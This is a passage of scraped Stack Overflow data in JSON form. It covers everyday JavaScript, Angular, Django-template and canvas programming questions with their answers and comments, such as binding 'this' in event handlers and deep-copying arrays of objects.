{"reputation": 773, "user_id": 2351594, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/34742b805174b62786c7b75c9a104089?s=128&d=identicon&r=PG&f=1", "display_name": "Paul", "link": "https://stackoverflow.com/users/2351594/paul"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 5049, "favorite_count": 1, "accepted_answer_id": 56321916, "answer_count": 2, "score": 4, "last_activity_date": 1574339779, "creation_date": 1558559156, "last_edit_date": 1559144804, "question_id": 56265020, "link": "https://stackoverflow.com/questions/56265020/how-to-push-mat-list-items-to-the-bottom-without-using-absolute-position-in-angu", "title": "How to push mat-list-items to the bottom without using absolute position in Angular Material?", "body": "<p>I have just started using Angular Material and I wanted to implement the sidenav to have items that are at the bottom of the page. For now I am able to accomplish it with css.</p>\n\n<pre><code>position: absolute;\nleft: 0;\nbottom: 0; \n</code></pre>\n\n<p>Is there any way to put spaces between items? My issue comes when I resize the page, the bottom items overlap with the items which are above.</p>\n\n<p>I've included screenshots and the code below. Thanks.</p>\n\n<p><a href=\"https://i.stack.imgur.com/698ws.jpg\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/698ws.jpg\" alt=\"Full screen window\"></a></p>\n\n<p><a href=\"https://i.stack.imgur.com/lX6K8.jpg\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/lX6K8.jpg\" alt=\"Resized window\"></a></p>\n\n<pre><code>&lt;mat-sidenav-container class=\"h-screen w-screen\"&gt;\n&lt;mat-sidenav #sidenav class=\"shadow border-0\" fixedInViewport mode=\"side\" opened&gt;  \n    &lt;mat-toolbar&gt;\n        &lt;button mat-mini-fab color=\"warn\" (click)=\"navigation.toggle()\"&gt;\n            &lt;mat-icon inline=true fontSet=\"fa\" fontIcon=\"fa-fire\" aria-label=\"SLMC Logo\"&gt;&lt;/mat-icon&gt;\n        &lt;/button&gt;\n    &lt;/mat-toolbar&gt;\n    &lt;mat-nav-list&gt;\n        &lt;a mat-list-item&gt;\n            &lt;button mat-icon-button&gt;\n                &lt;mat-icon inline=true fontSet=\"fa\" fontIcon=\"fa-users-cog\" aria-label=\"Administrator\"&gt;&lt;/mat-icon&gt;\n            &lt;/button&gt;\n        &lt;/a&gt;\n        &lt;a mat-list-item&gt;\n            &lt;button mat-icon-button&gt;\n                &lt;mat-icon inline=true fontSet=\"fa\" fontIcon=\"fa-tachometer-alt\" aria-label=\"Services\"&gt;&lt;/mat-icon&gt;\n            &lt;/button&gt;\n        &lt;/a&gt;\n        &lt;a mat-list-item&gt;\n            &lt;button mat-icon-button&gt;\n                &lt;mat-icon inline=true fontSet=\"fa\" fontIcon=\"fa-chart-bar\" aria-label=\"Analytics\"&gt;&lt;/mat-icon&gt;\n            &lt;/button&gt;\n        &lt;/a&gt;\n        &lt;a mat-list-item&gt;\n            &lt;button mat-icon-button&gt;\n                &lt;mat-icon inline=true fontSet=\"fa\" fontIcon=\"fa-plus\" aria-label=\"Compose\"&gt;&lt;/mat-icon&gt;\n            &lt;/button&gt;\n        &lt;/a&gt;\n\n        &lt;!-- This is where the bottom items reside.--&gt;\n        &lt;div class=\"absolute bottom-0 left-0\"&gt; \n            &lt;a mat-list-item&gt;\n                &lt;button mat-icon-button&gt;\n                    &lt;mat-icon inline=true fontSet=\"fa\" fontIcon=\"fa-bell\" aria-label=\"Notifications\"&gt;&lt;/mat-icon&gt;\n                &lt;/button&gt;\n            &lt;/a&gt;\n            &lt;a mat-list-item&gt;\n                &lt;button mat-icon-button&gt;\n                    &lt;mat-icon inline=true fontSet=\"fa\" fontIcon=\"fa-user\" aria-label=\"User Account\"&gt;&lt;/mat-icon&gt;\n                &lt;/button&gt;\n            &lt;/a&gt;\n            &lt;a mat-list-item&gt;\n                &lt;button mat-icon-button&gt;\n                    &lt;mat-icon inline=true fontSet=\"fa\" fontIcon=\"fa-cog\" aria-label=\"Settings\"&gt;&lt;/mat-icon&gt;\n                &lt;/button&gt;\n            &lt;/a&gt;\n        &lt;/div&gt;\n    &lt;/mat-nav-list&gt;\n&lt;/mat-sidenav&gt;\n&lt;mat-sidenav-content&gt;\n    &lt;mat-sidenav-container&gt;\n        &lt;mat-sidenav #navigation class=\"shadow border-0\" fixedInViewport mode=\"side\" opened&gt;\n            &lt;app-navigation (toggleNavigation)=\"navigation.toggle()\"&gt;&lt;/app-navigation&gt;\n        &lt;/mat-sidenav&gt;\n        &lt;mat-sidenav-content class=\"page-wrap\"&gt;\n            &lt;app-header&gt;&lt;/app-header&gt;\n            &lt;main class=\"flex-1\"&gt;\n                &lt;router-outlet&gt;&lt;/router-outlet&gt;\n            &lt;/main&gt;\n            &lt;app-footer&gt;&lt;/app-footer&gt;\n        &lt;/mat-sidenav-content&gt;\n    &lt;/mat-sidenav-container&gt;\n&lt;/mat-sidenav-content&gt;\n</code></pre>\n\n<p></p>\n"}, {"tags": ["javascript", "angular", "typescript"], "comments": [{"owner": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 2, "creation_date": 1558559254, "post_id": 56264992, "comment_id": 99146388, "body": "Have you <a href=\"https://angular.io/guide/pipes#custom-pipes\" rel=\"nofollow noreferrer\">read the docs</a>? Also A boolean is either true or false, so it doesn&#39;t make sense to have three cases."}], "answers": [{"tags": [], "owner": {"reputation": 15130, "user_id": 1679126, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/82c8608808b8c4c719e9d0c71fb5c366?s=128&d=identicon&r=PG", "display_name": "Adrian Brand", "link": "https://stackoverflow.com/users/1679126/adrian-brand"}, "is_accepted": true, "score": 0, "last_activity_date": 1558570384, "creation_date": 1558570384, "answer_id": 56266526, "question_id": 56264992, "link": "https://stackoverflow.com/questions/56264992/how-to-convert-a-function-into-a-pipe-function/56266526#56266526", "title": "How to convert a function into a Pipe Function", "body": "<pre><code>import { Pipe, PipeTransform } from '@angular/core';\n\n@Pipe({\n  name: 'bool'\n})\nexport class BoolPipe implements PipeTransform {\n  transform(value: any): string {\n    return value ? 'true' : 'false';\n  }\n}\n</code></pre>\n\n<p>in your template use it with</p>\n\n<pre><code>{{ yourBoolProperty | bool }}\n</code></pre>\n\n<p>You can scaffold up a new pipe with the cli by typing \"ng g p Bool\" or \"ng generate pipe Bool\"</p>\n"}], "owner": {"reputation": 107, "user_id": 11205399, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e4602361ea66c61fed754346dfd62546?s=128&d=identicon&r=PG&f=1", "display_name": "JacobTStaggs", "link": "https://stackoverflow.com/users/11205399/jacobtstaggs"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 85, "favorite_count": 0, "accepted_answer_id": 56266526, "answer_count": 1, "score": 1, "last_activity_date": 1558570384, "creation_date": 1558559008, "question_id": 56264992, "link": "https://stackoverflow.com/questions/56264992/how-to-convert-a-function-into-a-pipe-function", "title": "How to convert a function into a Pipe Function", "body": "<p>I have a function that I am trying to convert into a pipe function but I am still unsure after reading the documentation on angular's website. </p>\n\n<p>After following the documentation on their website it has left me still kind of confused.</p>\n\n<pre><code>checkBoolean() {\n    if (boolean) {\n      return 'true';\n    } else if (!boolean) {\n      return 'false';\n    } else {\n      return 'true';\n    }\n  }\n</code></pre>\n\n<p>The code works fine in this method but I am wanting to switch it to a pipe function.</p>\n"}, {"tags": ["javascript"], "comments": [{"owner": {"reputation": 1399, "user_id": 1496080, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/Bn5Ny.jpg?s=128&g=1", "display_name": "damian", "link": "https://stackoverflow.com/users/1496080/damian"}, "edited": false, "score": 1, "creation_date": 1558558966, "post_id": 56264956, "comment_id": 99146275, "body": "it&#39;s common to set a variable to <code>this</code> so you can reference it later when it&#39;s out of scope. ex: <code>let ctx = this; this.init = function(){....ctx.tiles[i]}</code>"}], "answers": [{"tags": [], "owner": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "is_accepted": false, "score": 1, "last_activity_date": 1558559505, "creation_date": 1558559505, "answer_id": 56265084, "question_id": 56264956, "link": "https://stackoverflow.com/questions/56264956/how-can-i-reference-object-data-within-an-object-function/56265084#56265084", "title": "How can I reference object data within an object function?", "body": "<p>You could use a curried function, and call the outer one with the game instance (<code>this</code>) then you can use it inside:</p>\n\n<pre><code> this.tiles[i].addEventListener('click', this.handleClick(this));\n\n //...\n\nthis.handleClick = function(game) {\n return function() {\n    let id = parseInt(this.id.replace('game-tile-', ''));\n    console.log(id); // returns 0, 1, 2, etc.\n    console.log(game.turn); \n };\n};\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 0, "creation_date": 1558559621, "post_id": 56265086, "comment_id": 99146533, "body": "The second way won&#39;t work as the OP wants to access the clicked element too."}], "tags": [], "owner": {"reputation": 1236, "user_id": 6839787, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/10205338961311958/picture?type=large", "display_name": "Alexandre Senges", "link": "https://stackoverflow.com/users/6839787/alexandre-senges"}, "is_accepted": false, "score": 0, "last_activity_date": 1558559877, "last_edit_date": 1558559877, "creation_date": 1558559514, "answer_id": 56265086, "question_id": 56264956, "link": "https://stackoverflow.com/questions/56264956/how-can-i-reference-object-data-within-an-object-function/56265086#56265086", "title": "How can I reference object data within an object function?", "body": "<p>There's two ways you can do this, either by saving <code>this</code> to a variable you will use later (we call this a closure):</p>\n\n<p>for instance:</p>\n\n<pre><code>const self = this;\nthis.handleClick = function() {\n    const id = parseInt(this.id.replace('game-tile-', ''));\n};\n</code></pre>\n\n<p>Or by calling bind, which will bind the <code>this</code> object of the function to the <code>this</code> of the current scope:</p>\n\n<pre><code>this.handleClick = function() {\n    const id = parseInt(this.id.replace('game-tile-', ''));\n};\nthis.handleClick = this.handleClick.bind(this);\n</code></pre>\n\n<p>PS:</p>\n\n<p>If you can use ES6 Arrow functions:</p>\n\n<pre><code>this.handleClick = () =&gt; {\n    // this will point to the scope where the function is declared\n}\n</code></pre>\n\n<p>If you can use ES6 classes:</p>\n\n<pre><code>class Game(){\n    constructor(){\n        this.tiles = document.getElementsByClassName('game-tile'),\n        this.turn = 0;\n        for (let i = 0; i &lt; this.tiles.length; i++) {\n        // reset game tiles\n        this.tiles[i].innerHTML = '';\n\n        // setup event listeners\n        this.tiles[i].addEventListener('click', this.handleClick);\n    }\n\n    handleClick = () =&gt; {\n        let id = parseInt(this.id.replace('game-tile-', ''));\n        console.log(id); // returns 0, 1, 2, etc.\n        console.log(this.turn); // returns undefined\n    }\n}\n</code></pre>\n\n<p>It is better to use ES6 syntax because it is easier to understand for both the reader and the machine. If you are worried about browser compability, use a transpiler like <a href=\"https://babeljs.io/\" rel=\"nofollow noreferrer\">BabelJS</a></p>\n"}, {"comments": [{"owner": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 1, "creation_date": 1558559858, "post_id": 56265087, "comment_id": 99146628, "body": "The second version won&#39;t work for the usecase shown by the OP."}], "tags": [], "owner": {"reputation": 106594, "user_id": 575527, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/a1120319639f8c7ea84d66d4334bdfa9?s=128&d=identicon&r=PG", "display_name": "Joseph", "link": "https://stackoverflow.com/users/575527/joseph"}, "is_accepted": false, "score": 1, "last_activity_date": 1558559872, "last_edit_date": 1558559872, "creation_date": 1558559525, "answer_id": 56265087, "question_id": 56264956, "link": "https://stackoverflow.com/questions/56264956/how-can-i-reference-object-data-within-an-object-function/56265087#56265087", "title": "How can I reference object data within an object function?", "body": "<p>JavaScript's <code>this</code> value is determined at call time and how it's called. When you click on a tile, the browser reacts by invoking <code>handleClick</code>. The <code>this</code> value is usually the element clicked. <code>this.turn</code> is <code>undefined</code> because your element does not have a property <code>turn</code>.</p>\n\n<p>What you do is store the value of <code>this</code> in a separate variable within scope. This way, you can refer to <code>this</code> without using the keyword <code>this</code>.</p>\n\n<pre><code>function Game() {\n  // The value of \"this\" in a constructor is the instance of the constructor.\n  // We store a reference of \"this\" in variable \"foo\" (could be anything really).\n  const foo = this\n\n  this.handleClick = function() {\n    // Use \"instance\" instead of \"this\".\n    console.log(foo.turn)\n  };\n}\n</code></pre>\n\n<hr>\n\n<p>Alternatively, you can use <code>function.bind()</code> to bind the value of <code>this</code> (i.e. create an identical function whose <code>this</code> value is already defined ahead of time, instead of at call time). </p>\n\n<pre><code>function Game() {\n  this.init = function() {\n    for (let i = 0; i &lt; this.tiles.length; i++) {\n      // Tell the browser that when it calls handleClick, the value\n      // of \"this\" is the one we provided in bind.\n      this.tiles[i].addEventListener('click', this.handleClick.bind(this))\n    }\n  }\n  this.handleClick = function() {\n    console.log(this.turn); // returns undefined\n  };\n}\n\nconst game = new Game()\ngame.init()\n</code></pre>\n\n<p>Note that this approach also relies on how <code>init()</code> is called, because it also determines what <code>init</code>'s <code>this</code> value is. If I call it differently, like the following:</p>\n\n<pre><code>const game = new Game()\nconst init = game.init()\ninit()\n</code></pre>\n\n<p><code>init</code>'s <code>this</code> will be <code>window</code> (normal mode) or <code>undefined</code> (strict mode), which will cause the binding of <code>handleClick</code> to use that value.</p>\n"}, {"comments": [{"owner": {"reputation": 881, "user_id": 7933157, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/fX7bb.jpg?s=128&g=1", "display_name": "Sam Sverko", "link": "https://stackoverflow.com/users/7933157/sam-sverko"}, "edited": false, "score": 0, "creation_date": 1558560531, "post_id": 56265140, "comment_id": 99146849, "body": "This solution works perfect for me! Would you be able to explain the difference between an object function with and without the <code>this</code> keyword? Example: <code>this.myFunction = function() {}</code> versus <code>function myFunction() {}</code>?"}, {"owner": {"reputation": 1246, "user_id": 673416, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dbb390eeae629eeb7e68c00e260c2c26?s=128&d=identicon&r=PG", "display_name": "Alexandre Morgaut", "link": "https://stackoverflow.com/users/673416/alexandre-morgaut"}, "reply_to_user": {"reputation": 881, "user_id": 7933157, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/fX7bb.jpg?s=128&g=1", "display_name": "Sam Sverko", "link": "https://stackoverflow.com/users/7933157/sam-sverko"}, "edited": false, "score": 0, "creation_date": 1558684508, "post_id": 56265140, "comment_id": 99189000, "body": "Function Declaration: <code>function foo() {}</code> - declares the function in the function scope WITH its implementation - makes it directly available from the top of the scope (&quot;hoisting&quot;) - the <code>this</code> context is not defined but can be assigned on call. If I used <code>var foo = function() {}</code> (function expression), <code>foo</code> would be declared and hoisted but it would remain undefined until the expression is evaluated. Assign a function (declaration or expression) to an object property (<code>this.func = foo</code> or <code>obj.func = foo</code>) AND call it FROM it (<code>obj.func()</code>), the <code>this</code> context will reference the obj."}], "tags": [], "owner": {"reputation": 1246, "user_id": 673416, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dbb390eeae629eeb7e68c00e260c2c26?s=128&d=identicon&r=PG", "display_name": "Alexandre Morgaut", "link": "https://stackoverflow.com/users/673416/alexandre-morgaut"}, "is_accepted": true, "score": 1, "last_activity_date": 1558559842, "creation_date": 1558559842, "answer_id": 56265140, "question_id": 56264956, "link": "https://stackoverflow.com/questions/56264956/how-can-i-reference-object-data-within-an-object-function/56265140#56265140", "title": "How can I reference object data within an object function?", "body": "<p>here a basic solution</p>\n\n<pre><code>function Game() {\n    this.tiles = document.getElementsByClassName('game-tile'),\n    this.turn = 0;\n\n    this.init = function() {\n        let tile;\n        for (let i = 0; i &lt; this.tiles.length; i++) {\n            tile = this.tiles[i];\n            // reset game tiles\n            tile.innerHTML = '';\n\n            // setup event listeners\n            // don't mix this for the node &amp; this for the game\n            // let's bind the context to the game, and the first param to the tile\n            tile.addEventListener('click', handleClick.bind(this, tile));\n        }\n    };\n\n    function handleClick(tile) {\n        let id = parseInt(tile.id.replace('game-tile-', ''));\n        console.log(id); // returns 0, 1, 2, etc.\n        console.log(this.turn); // returns undefined\n    };\n}\n\nlet game = new Game();\ngame.init();\n</code></pre>\n"}], "owner": {"reputation": 881, "user_id": 7933157, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/fX7bb.jpg?s=128&g=1", "display_name": "Sam Sverko", "link": "https://stackoverflow.com/users/7933157/sam-sverko"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 57, "favorite_count": 0, "accepted_answer_id": 56265140, "answer_count": 4, "score": 0, "last_activity_date": 1558559877, "creation_date": 1558558813, "question_id": 56264956, "link": "https://stackoverflow.com/questions/56264956/how-can-i-reference-object-data-within-an-object-function", "title": "How can I reference object data within an object function?", "body": "<p>I'm trying to make a simple tic tac toe game to learn and practice JavaScript OOP and am having some difficulties.</p>\n\n<p>I would like to reference the <code>game.turn</code> value when firing the <code>game.handleClick</code> function. I know that using the <code>this</code> keyword references the scope of the thing being called, and in <code>handleClick</code>, the <code>this</code> refers to the <code>game-tile-x</code> being clicked. How can I reference object values that are outside of the 'handleClick' function scope?</p>\n\n<p>Any help would be deeply appreciated!</p>\n\n<pre class=\"lang-html prettyprint-override\"><code>&lt;div id=\"game-board\"&gt;\n    &lt;div id=\"game-tile-1\" class=\"game-tile\"&gt;&lt;/div&gt;\n    &lt;!-- divs 2-8 --&gt;\n    &lt;div id=\"game-tile-9\" class=\"game-tile\"&gt;&lt;/div&gt;\n&lt;/div&gt;\n</code></pre>\n\n<pre><code>function Game() {\n    this.tiles = document.getElementsByClassName('game-tile'),\n    this.turn = 0;\n\n    this.init = function() {\n        for (let i = 0; i &lt; this.tiles.length; i++) {\n            // reset game tiles\n            this.tiles[i].innerHTML = '';\n\n            // setup event listeners\n            this.tiles[i].addEventListener('click', this.handleClick);\n        }\n    };\n    this.handleClick = function() {\n        let id = parseInt(this.id.replace('game-tile-', ''));\n        console.log(id); // returns 0, 1, 2, etc.\n        console.log(this.turn); // returns undefined\n    };\n}\n\nlet game = new Game();\ngame.init();\n</code></pre>\n"}, {"tags": ["javascript", "django", "django-templates"], "comments": [{"owner": {"reputation": 412, "user_id": 5095849, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-JOXCrTEd5iM/AAAAAAAAAAI/AAAAAAAAJGA/DkW8N557JPg/photo.jpg?sz=128", "display_name": "Amaro Vita", "link": "https://stackoverflow.com/users/5095849/amaro-vita"}, "edited": false, "score": 0, "creation_date": 1558558852, "post_id": 56264924, "comment_id": 99146210, "body": "Try <code>console.log(&quot;{{ l }}&quot;)</code> then..."}], "answers": [{"comments": [{"owner": {"reputation": 1122, "user_id": 478213, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/91d30ada5a4ca4f2b9c6cd34ea92b5d3?s=128&d=identicon&r=PG", "display_name": "NickP", "link": "https://stackoverflow.com/users/478213/nickp"}, "edited": false, "score": 0, "creation_date": 1558559048, "post_id": 56264977, "comment_id": 99146305, "body": "Thanks, this works perfectly. Is there an equivalent to handle the whole array in one go? i.e. &quot;{{ l }}&quot; would be an array? Or, would I need to loop through this one by one to convert?"}, {"owner": {"reputation": 538898, "user_id": 104349, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0f4cefeedec5163556751d61625eedd0?s=128&d=identicon&r=PG", "display_name": "Daniel Roseman", "link": "https://stackoverflow.com/users/104349/daniel-roseman"}, "reply_to_user": {"reputation": 1122, "user_id": 478213, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/91d30ada5a4ca4f2b9c6cd34ea92b5d3?s=128&d=identicon&r=PG", "display_name": "NickP", "link": "https://stackoverflow.com/users/478213/nickp"}, "edited": false, "score": 0, "creation_date": 1558559655, "post_id": 56264977, "comment_id": 99146556, "body": "Not really sure what you mean; this would work fine with an array."}], "tags": [], "owner": {"reputation": 538898, "user_id": 104349, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0f4cefeedec5163556751d61625eedd0?s=128&d=identicon&r=PG", "display_name": "Daniel Roseman", "link": "https://stackoverflow.com/users/104349/daniel-roseman"}, "is_accepted": true, "score": 0, "last_activity_date": 1558558941, "creation_date": 1558558941, "answer_id": 56264977, "question_id": 56264924, "link": "https://stackoverflow.com/questions/56264924/string-passed-through-django-is-undefined-in-javascript-but-renders-fine/56264977#56264977", "title": "String passed through Django is undefined in JavaScript but renders fine", "body": "<p><code>l</code> will render as its literal value. But JavaScript doesn't know what that value means. You need to wrap it in quotes.</p>\n\n<pre><code>console.log(\"{{ l }}\")\n</code></pre>\n"}], "owner": {"reputation": 1122, "user_id": 478213, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/91d30ada5a4ca4f2b9c6cd34ea92b5d3?s=128&d=identicon&r=PG", "display_name": "NickP", "link": "https://stackoverflow.com/users/478213/nickp"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 16, "favorite_count": 0, "accepted_answer_id": 56264977, "answer_count": 1, "score": 0, "last_activity_date": 1558558941, "creation_date": 1558558722, "question_id": 56264924, "link": "https://stackoverflow.com/questions/56264924/string-passed-through-django-is-undefined-in-javascript-but-renders-fine", "title": "String passed through Django is undefined in JavaScript but renders fine", "body": "<p>In Django, I am passing an array of strings ['A', 'B', 'C'] to the view and hoping to use these with a JavaScript script I have on the page.</p>\n\n<p>However, even though I am able to display the contents in HTML, when I try use them in JavaScript like such:</p>\n\n<pre><code>{% for l in labs %}\nconsole.log({{ l }})\n{% endfor %}\n</code></pre>\n\n<p>I get an error that 'Reference Error A is undefined' which I cannot comprehend. How is it possible if it is undefined when clearly by referencing the value it is infact defined?</p>\n"}, {"tags": ["javascript", "arrays"], "comments": [{"owner": {"reputation": 319259, "user_id": 1447675, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ziYmO.gif?s=128&g=1", "display_name": "Nina Scholz", "link": "https://stackoverflow.com/users/1447675/nina-scholz"}, "edited": false, "score": 2, "creation_date": 1558558791, "post_id": 56264880, "comment_id": 99146186, "body": "why not stringify and parse the object?"}, {"owner": {"reputation": 2824, "user_id": 10864356, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/315465d723d17533b95c0615fd7201cc?s=128&d=identicon&r=PG&f=1", "display_name": "gkeenley", "link": "https://stackoverflow.com/users/10864356/gkeenley"}, "reply_to_user": {"reputation": 11274, "user_id": 9078341, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TAD0A.png?s=128&g=1", "display_name": "Randy Casburn", "link": "https://stackoverflow.com/users/9078341/randy-casburn"}, "edited": false, "score": 0, "creation_date": 1558558886, "post_id": 56264880, "comment_id": 99146229, "body": "@RandyCasburn I added a comment explaining why these questions are different."}, {"owner": {"reputation": 2824, "user_id": 10864356, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/315465d723d17533b95c0615fd7201cc?s=128&d=identicon&r=PG&f=1", "display_name": "gkeenley", "link": "https://stackoverflow.com/users/10864356/gkeenley"}, "reply_to_user": {"reputation": 319259, "user_id": 1447675, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ziYmO.gif?s=128&g=1", "display_name": "Nina Scholz", "link": "https://stackoverflow.com/users/1447675/nina-scholz"}, "edited": false, "score": 0, "creation_date": 1558558924, "post_id": 56264880, "comment_id": 99146249, "body": "@NinaScholz I added a comment addressing that. That does work, but I&#39;m wondering if there&#39;s a cleaner solution :) So far though, that&#39;s the cleanest I&#39;ve found."}, {"owner": {"reputation": 7070, "user_id": 1281907, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/CZtbt.png?s=128&g=1", "display_name": "talemyn", "link": "https://stackoverflow.com/users/1281907/talemyn"}, "edited": false, "score": 1, "creation_date": 1558558973, "post_id": 56264880, "comment_id": 99146278, "body": "@gkeenley - while the questions are different, take a look at the second highest voted answer ( <a href=\"https://stackoverflow.com/a/23536726/1281907\">stackoverflow.com/a/23536726/1281907</a> ), which goes into a <b>lot</b> of detail around the different was to copy arrays."}, {"owner": {"reputation": 15130, "user_id": 1679126, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/82c8608808b8c4c719e9d0c71fb5c366?s=128&d=identicon&r=PG", "display_name": "Adrian Brand", "link": "https://stackoverflow.com/users/1679126/adrian-brand"}, "edited": false, "score": 0, "creation_date": 1558569893, "post_id": 56264880, "comment_id": 99148990, "body": "Don&#39;t stringify, <a href=\"https://stackblitz.com/edit/typescript-qmzgf7\" rel=\"nofollow noreferrer\">stackblitz.com/edit/typescript-qmzgf7</a>"}, {"owner": {"reputation": 15130, "user_id": 1679126, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/82c8608808b8c4c719e9d0c71fb5c366?s=128&d=identicon&r=PG", "display_name": "Adrian Brand", "link": "https://stackoverflow.com/users/1679126/adrian-brand"}, "edited": false, "score": 0, "creation_date": 1558569970, "post_id": 56264880, "comment_id": 99149003, "body": "const clone = obj =&gt;   Array.isArray(obj)     ? obj.map(item =&gt; clone(item))     : obj instanceof Date     ? new Date(obj.getTime())     : obj &amp;&amp; typeof obj === &#39;object&#39;     ? Object.getOwnPropertyNames(obj).reduce((o, prop) =&gt; {         o[prop] = clone(obj[prop]);         return o;       }, {})     : obj;"}], "owner": {"reputation": 2824, "user_id": 10864356, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/315465d723d17533b95c0615fd7201cc?s=128&d=identicon&r=PG&f=1", "display_name": "gkeenley", "link": "https://stackoverflow.com/users/10864356/gkeenley"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 50, "favorite_count": 1, "closed_date": 1558560438, "answer_count": 0, "score": 2, "last_activity_date": 1558559364, "creation_date": 1558558477, "last_edit_date": 1558559364, "question_id": 56264880, "link": "https://stackoverflow.com/questions/56264880/how-to-copy-an-array-of-objects-in-javascript", "closed_reason": "Duplicate", "title": "How to copy an array of objects in Javascript?", "body": "<p>In the following code, I create an array <code>a</code> of objects that each has a property <code>b</code> that is initialized to 0. I copy <code>a</code> into <code>c</code> with the spread operator, hoping that I'll be able to manipulate <code>c</code> without affecting <code>a</code>. However, here's what happens:</p>\n\n<pre><code>let a = [\n    {\n        b: 0\n    },\n    {\n        b: 0\n    },\n    {\n        b: 0\n    },\n]\nlet c = [...a]\nc[0].b = 1\nconsole.log(a) // a gets modified when I modify c\n</code></pre>\n\n<p>I understand why this happens: since the elements of <code>a</code> are objects, their reference is copied when I create <code>c</code>, so the elements of <code>c</code> still refer to the corresponding elements of <code>a</code>.</p>\n\n<p>Does anyone know a way to solve this? What I want is a way to copy <code>a</code> and manipulate the properties of the objects in the resulting array without modifying the corresponding objects in <code>a</code>.</p>\n\n<p>Thanks!</p>\n\n<p><strong>Possible Solution</strong></p>\n\n<p>I know you can do JSON.parse(JSON.stringify(a)), but I'm wondering if there's a less hacky solution :)</p>\n\n<p><strong>Why this is different from <a href=\"https://stackoverflow.com/questions/7486085/copy-array-by-value\">Copy array by value</a></strong></p>\n\n<p>The <a href=\"https://stackoverflow.com/questions/7486085/copy-array-by-value\">Copy array by value</a> article asks about copying an array of primitives, in which the solution is the either use <code>slice()</code> or the spread operator. I've done that here, and the problem is different, as described in the question.</p>\n\n<p><strong>UPDATE: SOLUTION</strong></p>\n\n<p>As @talemyn pointed out, although <a href=\"https://stackoverflow.com/questions/7486085/copy-array-by-value/23536726#23536726\">Copy array by value</a> is a different question, the second highest voted response to that question goes into detail about deep copying, and from that, it seems the best solution for this use case is JSON.parse(JSON.stringify(c)). Thanks!</p>\n"}, {"tags": ["javascript", "canvas"], "comments": [{"owner": {"reputation": 11071, "user_id": 358435, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/b6a07b64e50a331ba65e6d5b9b410199?s=128&d=identicon&r=PG&f=1", "display_name": "karthick", "link": "https://stackoverflow.com/users/358435/karthick"}, "edited": false, "score": 0, "creation_date": 1558558642, "post_id": 56264852, "comment_id": 99146138, "body": "you can pass different center values and that will create new circles"}, {"owner": {"reputation": 11274, "user_id": 9078341, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TAD0A.png?s=128&g=1", "display_name": "Randy Casburn", "link": "https://stackoverflow.com/users/9078341/randy-casburn"}, "edited": false, "score": 0, "creation_date": 1558558656, "post_id": 56264852, "comment_id": 99146142, "body": "The <code>W</code> and <code>H</code> are the x &amp; y coordindates of the center of the circle. Move those: <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/arc\" rel=\"nofollow noreferrer\">developer.mozilla.org/en-US/docs/Web/API/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 10393600, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-YSx9Cdcfvq0/AAAAAAAAAAI/AAAAAAAAAAc/6bm-cdLBX3o/photo.jpg?sz=128", "display_name": "Jaleeyah Anderson", "link": 